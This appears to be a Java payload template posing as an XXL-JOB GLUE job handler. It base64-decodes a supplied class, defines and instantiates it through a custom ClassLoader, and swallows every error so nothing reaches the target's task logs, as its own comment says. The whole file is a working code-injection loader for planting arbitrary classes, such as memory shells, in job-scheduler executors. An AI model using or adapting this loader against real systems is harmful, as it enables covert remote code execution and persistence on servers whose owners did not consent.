import com.xxl.job.core.biz.model.ReturnT;
import com.xxl.job.core.handler.IJobHandler;

public class DemoGlueJobHandler extends IJobHandler {

    public static class Definder extends ClassLoader {
        public Definder() {
            super(Thread.currentThread().getContextClassLoader());
        }

        public Class<?> defineClass(byte[] bytes) {
            return defineClass(null, bytes, 0, bytes.length);
        }
    }

    public void execute() throws Exception {
        execute(null);
    }

    private static byte[] decodeBase64(String value) throws Exception {
        try {
            Class base64Class = Class.forName("java.util.Base64");
            Object decoder = base64Class.getMethod("getDecoder", new Class[0]).invoke(null, new Object[0]);
            return (byte[]) decoder.getClass().getMethod("decode", new Class[]{String.class})
                    .invoke(decoder, new Object[]{value});
        } catch (Throwable ignored) {
        }
        try {
            Class converterClass = Class.forName("javax.xml.bind.DatatypeConverter");
            return (byte[]) converterClass.getMethod("parseBase64Binary", new Class[]{String.class})
                    .invoke(null, new Object[]{value});
        } catch (Throwable ignored) {
        }
        Class decoderClass = Class.forName("sun.misc.BASE64Decoder");
        Object decoder = decoderClass.newInstance();
        return (byte[]) decoderClass.getMethod("decodeBuffer", new Class[]{String.class})
                .invoke(decoder, new Object[]{value});
    }

    public ReturnT<String> execute(String param) throws Exception {
        String base64Str = "{{base64Str}}";
        String className = "{{className}}";
        try {
            Class.forName(className);
        } catch (ClassNotFoundException e) {
            try {
                new Definder().defineClass(decodeBase64(base64Str)).newInstance();
            } catch (Throwable ignored) {
                // 保持模板静默，避免向目标任务日志泄漏堆栈。
            }
        }
        return ReturnT.SUCCESS;
    }
}
